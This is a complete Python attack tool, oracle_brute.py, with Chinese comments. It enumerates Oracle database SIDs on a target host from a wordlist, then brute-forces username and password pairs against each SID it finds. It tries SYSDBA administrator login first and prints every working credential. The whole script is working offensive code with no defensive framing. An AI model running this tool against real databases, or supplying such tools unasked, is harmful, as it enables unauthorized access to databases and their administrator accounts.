import oracledb
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple

def test_sid(host: str, port: int, sid: str) -> Tuple[bool, str]:
    """测试单个SID是否有效"""
    try:
        dsn = oracledb.makedsn(host, port, sid=sid)
        conn = oracledb.connect(user='invalid_user', password='invalid_pass', dsn=dsn)
        conn.close()
        return True, sid
    except oracledb.DatabaseError as e:
        error_code = str(e)
        if "ORA-01017" in error_code:
            return True, sid
        return False, sid

def enumerate_sids(host: str, port: int, sid_file: str, threads: int = 10) -> List[str]:
    """枚举所有有效的SID"""
    valid_sids = []
    
    try:
        with open(os.path.join('dict', sid_file), 'r') as f:
            sids = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"错误: 无法找到SID字典文件 dict/{sid_file}")
        sys.exit(1)

    print(f"[*] 开始枚举SID，目标: {host}:{port}")
    print(f"[*] 已加载 {len(sids)} 个SID进行测试")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(test_sid, host, port, sid) for sid in sids]
        
        for future in futures:
            is_valid, sid = future.result()
            if is_valid:
                valid_sids.append(sid)
                print(f"[+] 发现有效SID: {sid}")

    return valid_sids

def test_credentials(host: str, port: int, sid: str, username: str, password: str) -> Tuple[bool, str, str, bool]:
    """测试单个用户名密码组合，包括SYSDBA和普通用户身份"""
    try:
        dsn = oracledb.makedsn(host, port, sid=sid)
        # 尝试SYSDBA身份登录
        try:
            conn = oracledb.connect(user=username, password=password, dsn=dsn, mode=oracledb.AUTH_MODE_SYSDBA)
            conn.close()
            return True, username, password, True
        except oracledb.DatabaseError:
            # 尝试普通用户身份登录
            conn = oracledb.connect(user=username, password=password, dsn=dsn)
            conn.close()
            return True, username, password, False
    except oracledb.DatabaseError:
        return False, username, password, False

def brute_force_sid(host: str, port: int, sid: str, userfile: str, passfile: str, threads: int = 5) -> List[Tuple[str, str, bool]]:
    """对单个SID进行密码爆破"""
    valid_credentials = []
    
    try:
        with open(os.path.join('dict', userfile), 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(os.path.join('dict', passfile), 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        print(f"错误: 无法找到字典文件 {e.filename}")
        return valid_credentials

    print(f"\n[*] 开始对SID {sid} 进行密码爆破")
    print(f"[*] 已加载 {len(usernames)} 个用户名和 {len(passwords)} 个密码")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(
                    executor.submit(test_credentials, host, port, sid, username, password)
                )
        
        total = len(futures)
        for i, future in enumerate(futures, 1):
            success, username, password, is_sysdba = future.result()
            if success:
                valid_credentials.append((username, password, is_sysdba))
                role = "SYSDBA" if is_sysdba else "普通用户"
                print(f"[+] 发现有效凭据 - {username}:{password} ({role})")
            if i % 100 == 0:
                print(f"[*] 进度: {i}/{total} ({(i/total)*100:.2f}%)")

    return valid_credentials

def main():
    if len(sys.argv) != 3:
        print("用法: python oracle_brute.py <host> <port>")
        print("示例: python oracle_brute.py 192.168.1.100 1521")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    
    # 检查字典目录是否存在
    if not os.path.exists('dict'):
        print("错误: 未找到dict目录，请创建dict目录并放入字典文件")
        sys.exit(1)

    # 第一阶段：SID枚举
    print("[*] 第一阶段：SID枚举")
    valid_sids = enumerate_sids(host, port, "sid.txt")
    
    if not valid_sids:
        print("\n[-] 未发现有效SID，停止测试")
        sys.exit(1)

    print(f"\n[+] 发现 {len(valid_sids)} 个有效SID:")
    for sid in valid_sids:
        print(f"    - {sid}")

    # 第二阶段：密码爆破
    print("\n[*] 第二阶段：密码爆破")
    all_credentials = {}
    for sid in valid_sids:
        credentials = brute_force_sid(host, port, sid, "user.txt", "pwd.txt")
        if credentials:
            all_credentials[sid] = credentials

    # 输出最终结果
    print("\n[*] 测试完成")
    if all_credentials:
        print("[+] 发现以下有效凭据:")
        for sid, creds in all_credentials.items():
            print(f"\nSID: {sid}")
            for username, password, is_sysdba in creds:
                role = "SYSDBA" if is_sysdba else "普通用户"
                print(f"    用户名: {username:<20} 密码: {password:<20} 身份: {role}")
    else:
        print("[-] 未发现有效凭据")

if __name__ == "__main__":
    main()